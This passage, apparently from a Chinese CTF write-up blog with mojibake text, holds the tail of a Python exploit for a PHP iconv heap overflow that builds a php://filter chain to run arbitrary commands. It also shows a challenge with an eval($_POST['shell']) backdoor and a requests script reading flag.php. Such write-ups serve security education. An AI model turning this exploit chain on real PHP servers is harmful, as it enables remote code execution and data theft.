 step3 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>step3_size <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>BUG<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> BUG        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span> <span class="token operator">==</span> CS        step3_overflow <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step4_size <span class="token operator">=</span> CS        step4 <span class="token operator">=</span> <span class="token string">b"=00"</span> <span class="token operator">+</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>step4_size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>        step4 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        step4 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        step4 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        step4 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        <span class="token comment"># This chunk will eventually overwrite mm_heap->free_slot</span>        <span class="token comment"># it is actually allocated 0x10 bytes BEFORE it, thus the two filler values</span>        step4_pwn <span class="token operator">=</span> ptr_bucket<span class="token punctuation">(</span>            <span class="token number">0x200000</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token comment"># free_slot</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            ADDR_CUSTOM_HEAP<span class="token punctuation">,</span>  <span class="token comment"># 0x18</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            ADDR_HEAP<span class="token punctuation">,</span>  <span class="token comment"># 0x140</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            size<span class="token operator">=</span>CS<span class="token punctuation">,</span>        <span class="token punctuation">)</span>        step4_custom_heap <span class="token operator">=</span> ptr_bucket<span class="token punctuation">(</span>            ADDR_EMALLOC<span class="token punctuation">,</span> ADDR_EFREE<span class="token punctuation">,</span> ADDR_EREALLOC<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x18</span>        <span class="token punctuation">)</span>        step4_use_custom_heap_size <span class="token operator">=</span> <span class="token number">0x140</span>        COMMAND <span class="token operator">=</span> self<span class="token punctuation">.</span>command        COMMAND <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"kill -9 $PPID; </span><span class="token interpolation"><span class="token punctuation">&#123;</span>COMMAND<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>sleep<span class="token punctuation">:</span>            COMMAND <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"sleep </span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>sleep<span class="token punctuation">&#125;</span></span><span class="token string">; </span><span class="token interpolation"><span class="token punctuation">&#123;</span>COMMAND<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        COMMAND <span class="token operator">=</span> COMMAND<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\x00"</span>        <span class="token keyword">assert</span> <span class="token punctuation">(</span>            <span class="token builtin">len</span><span class="token punctuation">(</span>COMMAND<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> step4_use_custom_heap_size        <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"Command too big (</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>COMMAND<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">), it must be strictly inferior to </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>step4_use_custom_heap_size<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        COMMAND <span class="token operator">=</span> COMMAND<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>step4_use_custom_heap_size<span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> COMMAND        step4_use_custom_heap <span class="token operator">=</span> qpe<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        pages <span class="token operator">=</span> <span class="token punctuation">(</span>            step4 <span class="token operator">*</span> <span class="token number">3</span>            <span class="token operator">+</span> step4_pwn            <span class="token operator">+</span> step4_custom_heap            <span class="token operator">+</span> step4_use_custom_heap            <span class="token operator">+</span> step3_overflow            <span class="token operator">+</span> pad <span class="token operator">*</span> self<span class="token punctuation">.</span>pad            <span class="token operator">+</span> step1 <span class="token operator">*</span> <span class="token number">3</span>            <span class="token operator">+</span> step2_write_ptr            <span class="token operator">+</span> step2 <span class="token operator">*</span> <span class="token number">2</span>        <span class="token punctuation">)</span>        resource <span class="token operator">=</span> compress<span class="token punctuation">(</span>compress<span class="token punctuation">(</span>pages<span class="token punctuation">)</span><span class="token punctuation">)</span>        resource <span class="token operator">=</span> b64<span class="token punctuation">(</span>resource<span class="token punctuation">)</span>        resource <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>resource<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        filters <span class="token operator">=</span> <span class="token punctuation">[</span>            <span class="token comment"># Create buckets</span>            <span class="token string">"zlib.inflate"</span><span class="token punctuation">,</span>            <span class="token string">"zlib.inflate"</span><span class="token punctuation">,</span>                        <span class="token comment"># Step 0: Setup heap</span>            <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.L1.L1"</span><span class="token punctuation">,</span>                        <span class="token comment"># Step 1: Reverse FL order</span>            <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.L1.L1"</span><span class="token punctuation">,</span>                        <span class="token comment"># Step 2: Put fake pointer and make FL order back to normal</span>            <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.L1.L1"</span><span class="token punctuation">,</span>                        <span class="token comment"># Step 3: Trigger overflow</span>            <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.UTF-8.ISO-2022-CN-EXT"</span><span class="token punctuation">,</span>                        <span class="token comment"># Step 4: Allocate at arbitrary address and change zend_mm_heap</span>            <span class="token string">"convert.quoted-printable-decode"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.L1.L1"</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span>        filters <span class="token operator">=</span> <span class="token string">"|"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>filters<span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/read=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>filters<span class="token punctuation">&#125;</span></span><span class="token string">/resource=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>resource<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">return</span> path    <span class="token decorator annotation punctuation">@inform</span><span class="token punctuation">(</span><span class="token string">"Triggering..."</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        path <span class="token operator">=</span> self<span class="token punctuation">.</span>build_exploit_path<span class="token punctuation">(</span><span class="token punctuation">)</span>        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>path<span class="token punctuation">)</span>        <span class="token keyword">except</span> <span class="token punctuation">(</span>ConnectionError<span class="token punctuation">,</span> ChunkedEncodingError<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>                msg_print<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>sleep<span class="token punctuation">:</span>            msg_print<span class="token punctuation">(</span><span class="token string">"    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]"</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> start <span class="token operator">+</span> self<span class="token punctuation">.</span>sleep <span class="token operator">&lt;=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            msg_print<span class="token punctuation">(</span><span class="token string">"    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]"</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token comment"># Wrong heap, maybe? If the exploited suggested others, use them!</span>            msg_print<span class="token punctuation">(</span><span class="token string">"    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]"</span><span class="token punctuation">)</span>                msg_print<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">compress</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Returns data suitable for `zlib.inflate`.    """</span>    <span class="token comment"># Remove 2-byte header and 4-byte checksum</span>    <span class="token keyword">return</span> zlib<span class="token punctuation">.</span>compress<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">b64</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> base64<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> misalign <span class="token keyword">and</span> payload<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Misaligned: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>data<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">return</span> payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">compressed_bucket</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Returns a chunk of size 0x8000 that, when dechunked, returns the data."""</span>    <span class="token keyword">return</span> chunked_chunk<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">0x8000</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">qpe</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Emulates quoted-printable-encode.    """</span>    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>x<span class="token punctuation">:</span><span class="token format-spec">02x</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span> <span class="token keyword">for</span> x <span class="token keyword">in</span> data<span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ptr_bucket</span><span class="token punctuation">(</span><span class="token operator">*</span>ptrs<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Creates a 0x8000 chunk that reveals pointers after every step has been ran."""</span>    <span class="token keyword">if</span> size <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ptrs<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">==</span> size    bucket <span class="token operator">=</span> <span class="token string">b""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span>p64<span class="token punctuation">,</span> ptrs<span class="token punctuation">)</span><span class="token punctuation">)</span>    bucket <span class="token operator">=</span> qpe<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    <span class="token keyword">return</span> bucket<span class="token keyword">def</span> <span class="token function">chunked_chunk</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> size<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Constructs a chunked representation of the given chunk. If size is given, the    chunked representation has size `size`.    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.    """</span>    <span class="token comment"># The caller does not care about the size: let's just add 8, which is more than</span>    <span class="token comment"># enough</span>    <span class="token keyword">if</span> size <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span>    keep <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token string">b"\n\n"</span><span class="token punctuation">)</span>    size <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token format-spec">x</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>size <span class="token operator">-</span> keep<span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> size<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\n"</span> <span class="token operator">+</span> data <span class="token operator">+</span> <span class="token string">b"\n"</span><span class="token decorator annotation punctuation">@dataclass</span><span class="token keyword">class</span> <span class="token class-name">Region</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""A memory region."""</span>    start<span class="token punctuation">:</span> <span class="token builtin">int</span>    stop<span class="token punctuation">:</span> <span class="token builtin">int</span>    permissions<span class="token punctuation">:</span> <span class="token builtin">str</span>    path<span class="token punctuation">:</span> <span class="token builtin">str</span>    <span class="token decorator annotation punctuation">@property</span>    <span class="token keyword">def</span> <span class="token function">size</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>stop <span class="token operator">-</span> self<span class="token punctuation">.</span>startExploit<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="justread.png" loading="lazy"></p><p><img src="justread2.png" loading="lazy"></p><h4 id="1z-php"><a href="#1z-php" class="headerlink" title="1z_php"></a>1z_php</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># æˆ‘è®°å¾—å¥¹...å¥½åƒå«flag.phpå§ï¼Ÿ</span><span class="token variable">$emp</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'e_m.p'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$try</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'try'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$emp</span><span class="token operator">!=</span><span class="token string double-quoted-string">"114514"</span><span class="token operator">&amp;&amp;</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$emp</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">114514</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$emp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ctype_alpha</span><span class="token punctuation">(</span><span class="token variable">$emp</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ä½ ä¸æ˜¯hackerï¼Ÿé‚£è¯·å»å¤–åœºç­‰å€™ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"åªæœ‰çœŸæ­£çš„hackeræ‰èƒ½æ‹¿åˆ°flagï¼"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/.+?HACKER/is'</span><span class="token punctuation">,</span><span class="token variable">$try</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ä½ æ˜¯hackerè¿˜æ•¢è‡ªæŠ¥å®¶é—¨å‘¢ï¼Ÿ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$try</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'HACKER'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ä½ è¿è‡ªå·±æ˜¯hackeréƒ½ä¸æ‰¿è®¤ï¼Œè¿˜æƒ³è¦flagå‘¢ï¼Ÿ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"æ”¶æ‰‹å§hackerï¼Œä½ å¾—ä¸åˆ°flagçš„ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token variable">$c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"114514åˆ°åº•æ˜¯å•¥æ„æ€å˜ï¼Ÿã€‚ï¼Ÿ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment"># è§‰å¾—å›°éš¾çš„è¯å°±ç›´æ¥æŠŠshellæ‹¿å»ç”¨å§ï¼Œä¸ç”¨è°¢~</span><span class="token variable">$shell</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$shell</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>114514åˆ°åº•æ˜¯å•¥æ„æ€å˜ï¼Ÿã€‚ï¼Ÿ</code></pre><ol><li><strong>intval</strong> æœ‰ä¸€ä¸ªç‰¹æ€§ã€‚è¾“å…¥çš„å€¼å¦‚æœæ˜¯å­—ç¬¦ä¸²ï¼Œå®ƒè¿”å›çš„å†…å®¹å–å†³äºç¬¬ä¸€ä¸ªå­—ç¬¦å·¦ä¾§çš„æ•°å­—ã€‚å¦‚ intval(â€˜11a22â€™)&#x3D;11ã€‚</li><li><strong>ctype_alpha</strong> â€” åšçº¯å­—ç¬¦æ£€æµ‹ã€‚â€”â€”å¦‚æœåœ¨å½“å‰è¯­è¨€ç¯å¢ƒä¸­ text é‡Œçš„æ¯ä¸ªå­—ç¬¦éƒ½æ˜¯ä¸€ä¸ªå­—æ¯ï¼Œé‚£ä¹ˆå°±è¿”å›trueï¼Œåä¹‹åˆ™è¿”å›falseã€‚</li><li><strong>regexp</strong> æœ€å¤§å›æº¯</li><li>php åŸç”Ÿç±»</li></ol><p>Payload:</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">GET</span><span class="token punctuation">:</span> <span class="token header-value">?e[m.p=114514.1&amp;a=SplFileObject&amp;b=php://filter/read=convert.base64-encode/resource=flag.php&amp;c=__toString</span></span><span class="token header"><span class="token header-name keyword">POST</span><span class="token punctuation">:</span> <span class="token header-value">"hsad"*1000000+"HACKER"</span></span></code></pre><p>ä¹Ÿå¯ä»¥pythonä¸€æŠŠæ¢­</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://challenge.basectf.fun:48615/"</span>params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"e[m.p"</span><span class="token punctuation">:</span> <span class="token number">114514.1</span><span class="token punctuation">,</span>    <span class="token string">"a"</span><span class="token punctuation">:</span> <span class="token string">"SplFileObject"</span><span class="token punctuation">,</span>    <span class="token string">"b"</span><span class="token punctuation">:</span> <span class="token string">"php://filter/read=convert.base64-encode/resource=flag.php"</span><span class="token punctuation">,</span>    <span class="token string">"c"</span><span class="token punctuation">:</span> <span class="token string">"__toString"</span><span class="token punctuation">&#125;</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"try"</span><span class="token punctuation">:</span> <span class="token string">"hsad"</span><span class="token operator">*</span><span class="token number">250001</span><span class="token operator">+</span><span class="token string">"HACKER"</span><span class="token punctuation">&#125;</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token comment"># flag = "PD9waHAgPUJhc2VDVEZ7YWZhYzU2NjYtZWI2Yy00MGQ5LWJmMTUtYmQyYmY4OTk1MmQwfT8+Cg=="</span><span class="token comment"># decoded_flag = base64.b64decode(flag)</span><span class="token comment"># print(decoded_flag)</span></code></pre><h4 id="ez-php-gcå›æ”¶ï¼Œå¼•ç”¨ç»•è¿‡ï¼Œååºåˆ—åŒ–é€ƒé€¸"><a href="#ez-php-gcå›æ”¶ï¼Œå¼•ç”¨ç»•è¿‡ï¼Œååºåˆ—åŒ–é€ƒé€¸" class="headerlink" title="ez_php(gcå›æ”¶ï¼Œå¼•ç”¨ç»•è¿‡ï¼Œååºåˆ—åŒ–é€ƒé€¸)"></a>ez_php(gcå›æ”¶ï¼Œå¼•ç”¨ç»•è¿‡ï¼Œååºåˆ—åŒ–é€ƒé€¸)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">substrstr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"["</span><span class="token 